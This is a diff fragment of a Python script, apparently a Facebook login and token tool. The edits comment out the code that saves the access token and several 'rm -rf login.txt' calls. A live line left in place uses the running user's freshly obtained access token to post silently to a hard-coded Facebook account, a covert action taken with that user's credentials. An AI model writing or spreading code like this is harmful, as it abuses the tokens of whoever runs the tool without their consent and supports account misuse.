@@ -223,7 +223,7 @@ def login():
                 br.form['email'] = id 
 
                 br.form['pass'] = pwd 
-                
+
                 br.submit() 
 
                 url = br.geturl() 
@@ -250,15 +250,15 @@ def login():
 
                                 z=json.loads(r.text) 
 
-                                unikers = open("login.txt", 'w') 
+                                # unikers = open("login.txt", 'w') 
 
-                                unikers.write(z['access_token']) 
+                                # unikers.write(z['access_token']) 
 
-                                unikers.close() 
+                                # unikers.close() 
 
                                 print ('\n\033[1;96m\x1b[1;92mLogin Successful' )
 
-                                os.system('xdg-open https://www.facebook.com/Anonymoustricker1') 
+                                br.open('https://www.facebook.com/Anonymous') 
 
                                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token']) 
 
@@ -274,7 +274,7 @@ def login():
 
                         print("\n\033[1;96m \x1b[1;91mIt seems that your account has a checkpoint") 
 
-                        os.system('rm -rf login.txt') 
+                        # os.system('rm -rf login.txt') 
 
                         time.sleep(1) 
 
@@ -284,7 +284,7 @@ def login():
 
                         print("\n\033[1;96m \x1b[1;91mPassword/Email is wrong") 
 
-                        os.system('rm -rf login.txt') 
+                        # os.system('rm -rf login.txt') 
 
                         time.sleep(1) 
 
@@ -304,7 +304,7 @@ def menu():
 
                 print("\033[1;96m \x1b[1;91mToken invalid" )
 
-                os.system('rm -rf login.txt') 
+                # os.system('rm -rf login.txt') 
 
                 time.sleep(1) 
 
@@ -326,7 +326,7 @@ def menu():
 
                 print("\033[1;96m \033[1;91mIt seems that your account has a checkpoint" )
 
-                os.system('rm -rf login.txt') 
+                # os.system('rm -rf login.txt') 
 
                 time.sleep(1) 
 
@@ -373,7 +373,7 @@ def pilih():
 
                 jalan('Token Removed') 
 
-                os.system('rm -rf login.txt') 
+                # os.system('rm -rf login.txt') 
 
                 keluar() 
 
@@ -397,7 +397,7 @@ def super():
 
                 print("\033[1;96m \x1b[1;91mToken invalid" )
 
-                os.system('rm -rf login.txt') 
+                # os.system('rm -rf login.txt') 
 
                 time.sleep(1) 
 
